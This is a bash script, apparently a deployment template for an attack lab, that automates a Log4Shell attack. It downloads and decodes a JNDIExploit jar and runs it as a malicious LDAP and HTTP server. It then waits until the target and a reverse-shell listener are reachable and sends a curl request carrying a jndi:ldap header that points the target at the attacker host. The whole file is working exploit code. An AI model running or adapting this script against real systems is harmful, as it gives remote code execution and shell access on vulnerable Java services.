#!/bin/bash

JNDIEXPLOIT_URL="${jndiexploit_url}"
NAME="${name}"
IMAGE="${image}"
ATTACKER_IP="${attacker_ip}"
ATTACKER_HTTP_PORT=${attacker_http_port}
ATTACKER_LDAP_PORT=${attacker_ldap_port}
TARGET_IP=${target_ip}
TARGET_PORT=${target_port}
EXEC_TYPE="${exec_type}"
REVERSE_SHELL_PORT=${reverse_shell_port}
BASE64_PAYLOAD="${base64_payload}"
LOGFILE=/tmp/jndiexploit.sh.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
check_apt() {
    pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
    log "Waiting for apt to be available..."
    sleep 10
done

apt-get install -y openjdk-11-jdk unzip

PUBLIC_IP=$(curl -s https://icanhazip.com)
TIMEOUT=600
START_TIME=$(date +%s)
# Check if $ATTACKER_IP is an IP address
if [[ $ATTACKER_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    log "server is set to IP address $ATTACKER_IP, no need to resolve DNS"
else
    log "checking dns resolution: $ATTACKER_IP"
    while true; do
        IP=$(dig +short $ATTACKER_IP)
        if [ -z "$IP" ]; then  # If $IP is empty, the domain hasn't resolved yet
            CURRENT_TIME=$(date +%s)
            ELAPSED_TIME=$((CURRENT_TIME - START_TIME))
            if [ $ELAPSED_TIME -gt $TIMEOUT ]; then
                log "DNS resolution for $ATTACKER_IP timed out after $TIMEOUT seconds"
                exit 1
            fi
            sleep 10
        else
            log "Current public ip: $PUBLIC_IP"
            log "$ATTACKER_IP resolved to $IP"
            if [ "$IP" == "$PUBLIC_IP" ]; then
                log "Resolution matches public ip: $IP == $PUBLIC_IP"
                break
            else
                log "Resolution of dns does not match: $IP != $PUBLIC_IP"
                sleep 10
            fi
        fi
    done
fi

if [[ ! -f "jndi.base64" || ! -f "JNDIExploit-1.2-SNAPSHOT.jar" ]]; then
    rm -f jndi.base64 *.zip JNDIExploit-*.jar
    wget https://github.com/credibleforce/jndi/raw/main/jndi.base64
    base64 -d jndi.base64 > JNDIExploit.1.2.zip
    unzip -o JNDIExploit.*.zip
    rm *.zip
fi

log "setting up jndiexploit in screen session..."
if pgrep -f "JNDIExploit"; then
    kill -9 $(pgrep -f "JNDIExploit")
fi
screen -S jndiexploit -X quit
truncate -s 0 /tmp/jndiexploit.log
screen -d -L -Logfile /tmp/jndiexploit.log -S jndiexploit -m java -jar JNDIExploit-*.jar --ip $ATTACKER_IP --httpPort 8088 --ldapPort 1389
screen -S jndiexploit -X colon "logfile flush 0^M"

log "sleeping 15 minutes..."
sleep 900
log "start services availability check..."

log "checking target: $TARGET_IP:$TARGET_PORT"
while ! nc -z -w 5 -vv $TARGET_IP $TARGET_PORT > /dev/null; do
    log "failed check - waiting for target";
    sleep 30;
done;
log "target available";
log "checking attacker ldap: $ATTACKER_IP:$ATTACKER_LDAP_PORT"
while ! nc -z -w 5 -vv $ATTACKER_IP $ATTACKER_LDAP_PORT > /dev/null; do
    log "failed check - waiting for attacker ldap";
    sleep 30;
done;
log "attacker ldap available";
log "checking attacker http: $ATTACKER_IP:$ATTACKER_HTTP_PORT"
while ! nc -z -w 5 -vv $ATTACKER_IP $ATTACKER_HTTP_PORT > /dev/null; do
    log "failed check - waiting for attacker http";
    sleep 30;
done;
log "attacker http available";
if [ "0" != "$REVERSE_SHELL_PORT" ]; then
    log "checking attacker reverse shell: $ATTACKER_IP:$REVERSE_SHELL_PORT"
    while ! nc -z -w 5 -vv $ATTACKER_IP $REVERSE_SHELL_PORT > /dev/null; do
        log "failed check - waiting for attacker reverse shell";
        sleep 30;
    done;
    log "attacker reverse shell available";
fi
sleep 30;
log "sending payload: curl --verbose $TARGET_IP:$TARGET_PORT -H 'X-Api-Version: \$${jndi:ldap://$ATTACKER_IP:$ATTACKER_LDAP_PORT/$EXEC_TYPE/$BASE64_PAYLOAD}'"
/bin/bash -c "curl --verbose $TARGET_IP:$TARGET_PORT -H 'X-Api-Version: \$${jndi:ldap://$ATTACKER_IP:$ATTACKER_LDAP_PORT/$EXEC_TYPE/$BASE64_PAYLOAD}'"
log "done";


